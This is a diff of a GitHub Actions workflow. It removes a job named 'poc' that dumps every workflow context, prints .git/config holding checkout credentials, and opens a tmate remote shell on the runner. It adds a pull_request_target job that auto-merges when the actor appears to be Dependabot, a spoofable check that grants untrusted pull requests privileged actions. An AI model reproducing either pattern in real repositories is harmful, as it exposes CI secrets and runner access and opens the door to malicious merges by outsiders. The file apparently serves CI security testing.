@@ -1,41 +1,12 @@
-name: workflow run
+name: workflow dispatcher
 on:
-  workflow_run:
-    workflows: ["bacon"]
+  pull_request_target:
 
 jobs:
-    poc:
-      runs-on: ubuntu-latest
-      steps:
-      - name: Dump GitHub context
-        env:
-          GITHUB_CONTEXT: ${{ toJson(github) }}
-        run: echo "$GITHUB_CONTEXT"
-      - name: Dump job context
-        env:
-          JOB_CONTEXT: ${{ toJson(job) }}
-        run: echo "$JOB_CONTEXT"
-      - name: Dump steps context
-        env:
-          STEPS_CONTEXT: ${{ toJson(steps) }}
-        run: echo "$STEPS_CONTEXT"
-      - name: Dump runner context
-        env:
-          RUNNER_CONTEXT: ${{ toJson(runner) }}
-        run: echo "$RUNNER_CONTEXT"
-      - name: Dump strategy context
-        env:
-          STRATEGY_CONTEXT: ${{ toJson(strategy) }}
-        run: echo "$STRATEGY_CONTEXT"
-      - name: Dump matrix context
-        env:
-          MATRIX_CONTEXT: ${{ toJson(matrix) }}
-        run: echo "$MATRIX_CONTEXT"
-      - name: Check out the PR
-        uses: actions/checkout@v4
-        with:
-          ref: ${{ github.event.workflow_run.head_sha }}
-      - name: Git config
-        run: cat .git/config
-      - name: Setup tmate session
-        uses: mxschmitt/action-tmate@v3
+  a:
+    runs-on: ubuntu-latest
+    if: ${{ github.actor == 'dependabot[bot]' }}
+    steps:
+      - name: Run
+        run: gh pr merge
+      - uses: ad-m/github-push-action@v6
